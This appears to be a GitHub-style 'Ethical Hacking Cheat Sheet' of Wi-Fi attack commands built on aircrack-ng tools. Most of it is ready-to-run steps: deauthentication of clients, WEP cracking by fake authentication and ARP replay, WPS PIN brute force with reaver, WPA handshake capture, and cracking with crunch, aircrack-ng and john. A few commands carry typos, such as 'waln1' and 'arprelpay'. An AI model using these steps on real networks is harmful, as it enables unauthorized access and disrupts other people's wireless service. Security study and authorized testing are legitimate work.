# Ethical Hacking Cheat Sheet
# Table of Content

|Basic Commands|Advance Commands|
|--------------|----------------|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
|[]()|[]()|
---

## Basic Commads

> ### Check your Network Adapter

```bash
iwconfig 
```

> ### Check IP Address

 ```bash
 ifconfig
 ```


> ### Kill Network Manager
```bash
airmon-ng check kill
```

> ### Enable Network Manager

```bash
service NetworkManager start
```

> ### Restart Network Manager
```bash
systemctl restart NetworkManager
```

> ### Check Status of Network Manager
```bash
systemctl status NetworkManager
```

---

# Network Adapter Testing Commands

> ### Enable Monitor Mode
```bash
airmon-ng start wlan0
```

> ### Disable Monitor Mode
```bash
airmon-ng stop wlan0
```

> ### Packet Injection test
```bash
aireplay-ng --test wlan0
```

> ### Access Point Creation Test

you can put any fake MAC Address like this `00:01:02:03:04:05`
```bash
airbase-ng -a 00:01:02:03:04:05 --essid "<AP_name>" -c {channel_no.} wlan0
```
---
---

# Network Hacking

> ### Changing MAC Address
```bash
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```

MAC address will revert back to the original one once you restart the computer,
because we're only changing the MAC address in memory,
we're not really changing the physical MAC address.

---

# Pre-Connection Attack

> ### Sniff Network around `2.4 GHz`
```bash
airodump-ng wlan0
```

> ### Sniff Network Both `2.4 GHz and 5 GHz`
```bash
airodump-ng --band a wlan0
```

> ### Capture data both `2.4 GHz and 5 GHz`
```bash
airodump-ng --band abg wlan0
```

> ### Capture Data using `airodump-ng`
```bash
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan0
```
to analyze data
```bash
wireshark
```

## DE-Authentication Attack
```bash
aireplay-ng --deauth {no_of_deauth_packets} -a {router_MAC_add} -c {target_MAC_add} wlan0
```
if it`s fails then, target router on specfic channel

```bash
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} wlan0
```
---

# 2. Gaining Access

# WEP Cracking

<details>
    <summary>About WEP Encryption</summary>
<br/>
● Wired Equivalent Privacy. <br />
● Old encryption.<br />
● Uses an algorithm called RC4.<br />
● Still used in some networks.<br />
● Can be cracked easily.<br />
<br />
● Client encrypts data using a key.<br />
● Encrypted packet sent in the air.<br />
● Router decrypts packet using the key.<br />
<br />
● Each packet is encrypted using a unique key stream.<br />
● Random initialization vector (IV) is used to generate the keys streams.<br />
● The initialization vector is only 24 bits!<br />
● IV + Key (password) = Key stream.<br />

● IV is too small (only 24 bits).<br />
● IV is sent in plain text.<br />
<br />
Result:<br />
● IV’s will repeat on busy networks.<br />
● This makes WEP vulnerable to statistical attacks.<br />
● Repeated IVs can be used to determine the key stream;<br />
● And break the encryption<br />
<br />
Conclusion:<br />
To crack WEP we need to:<br />

1. Capture a large number of packets/IVs. → using airodump-ng<br />
2. Analyse the captured IVs and crack the key. → using aircrack-ng<br />
<br />

Problem:<br />
● If network is not busy.<br />
● It would take some time to capture enough IVs.<br />
Solution:<br />
→ Force the AP to generate new IVs.<br />
<br />
Fake Authentication<br />
Problem:<br />
● APs only communicate with connected clients.<br />
→ We can’t communicate with it.<br />
→ We can’t even start the attack.<br />
Solution: → Associate with the AP before launching the attack.<br />
<br />
ARP Request Replay<br />
● Wait for an ARP packet.<br />
● Capture it, and replay it (retransmit it).<br />
● This causes the AP to produce another packet with a new IV.<br />
● Keep doing this till we have enough IVs to crack the key.<br />
</details>

## 1. if target is busy
First you need to capture data.

```
airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write {file_name_without_extn} wlan0
```
We need to capture large no. of data, so that we are easily able crack key.

> ### WEP Cracking using `.cap File`

```
aircrack-ng {captured_.cap_file}
```
You Found Key like this `41:73:32:33:70`
remove colon behind the number `41:73:32:33:70` → `4173323370` is you cracked key.

---
## 2. if target is not busy
if your target network is not busy, `we need network busy to capture the data, to crack the key` the solution is to force the AP to generate new packets with new IVs, because by default AP ingnore the request they get unless the device connect to the network or associated with it,


> [!NOTE]\
> do parlelly bottom two commnads

# Fake-Authentication Attack

> ### Associate with router
```bash
aireplay-ng --fakeauth 0 -a {router_MAC_add} -h {Your_NIC_MAC_add} waln1
```

it's literally just telling the target network look, I want to communicate with you, Don't ignore my request.<br/>
here `--fakeauth 0` becuse we just need to associate with network once `--arprelpay` keep forcing the AP to produce another packet with a new IV. Keep doing this till we have enough IVs to crack the key.

# ARP Request Replay Attack
> ### Force Router to generate IVs
```bash
aireplay-ng --arpreplay -b {router_MAC_add} -h {your_NIC_MAC_add} waln1
```
> ### Crack WEP key Cracking
```bash
aircrack-ng {.cap}
```

---
---
# WPA / WPA2 Cracking

<details>
    <summary>more about WPA / WPA2</summary>
<br/>
● Both can be cracked using the same methods<br/>
● Made to address the issues in WEP.<br/>
● Much more secure.<br/>
● Each packet is encrypted using a unique temporary key.<br/>
<br/>
Exploiting WPS<br/>
● WPS is a feature that can be used with WPA & WPA2.<br/>
● Allows clients to connect without the password.<br/>
● Authentication is done using an 8 digit pin.<br/>
==}> ○ 8 Digits is very small.<br/>
==}> ○ We can try all possible pins in relatively short time.<br/>
==}> ○ Then the WPS pin can be used to compute the actual password.<br/>
PS: This only works if the router is configured not to use PBC (Push Button
Authentication).<br/>
<br/>
● Fixed all weaknesses in WEP.<br/>
● Packets contain no useful data.<br/>
● Only packets that can aid with the cracking process are the handshake packets.<br/>
==}> ○ These are 4 packets sent when a client connects to the network.<br/>
<br/>
● The handshake does not contain data the helps recover the key.<br/>
● It contains data that can be used to check weather a key is valid or
not.<br/>
</details>

## 1. WPA / WPA2 Cracking `Without Word list`

> ### Scan WPS Enable Network Around us

```bash
wash --interface wlan0
```

> [!NOTE]\
> do bottom two commands parlelly

> ### Fake-Authentication Attack
```bash
aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan0
```
>[!WARNING]\
>Current version of reaver have some bugs, you can use old version
>
>I have added old version of `reaver` in my github repo.

> ### Brute force the pin attack
```
reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan0 -vvv --no-associate 
```
---
## 2. WPA / WPA2 Cracking  using `With Word list` or `john-the-riper` tool
> ### WPA Handshake Capture
```bash
airodump-ng --bssid {router_MAc_add} --channel {channel_no.} --write {file_name_without_extn} wlan0
```
>[!NOTE]\
>Handshake is captured only when new client is connected. we can't wait so use de-authentication attack `parlelly`.

> # De-authentication attack
```bash
aireplay-ng --deauth {no_of_deauth_packet} -a {router_MAC_add} -c {target_d_MAc_add} wlan0
```
---
> # create word list
```bash
man crunch
crunch 6 8 {key length} abc12 {char used} -o test.txt
```
> ### Create word list using pattern
```bash
crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@b}
```
---
# WPA-key Cracking using `wordlist`
```bash
aircrack-ng {.cap} -w {Wordlist.txt}
```
---
# Crack Password Using `Handshake file`

> ### `.cap` to `.hccap`
```bash
aircrack-ng {.cap} -J {extension_name_not_required}
```
> ### `.hccap` to `.txt`
```bash
hccap2john {.hccap} > {.txt}
```

> ### Crack Password
```bash
john {.txt}
```

# =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)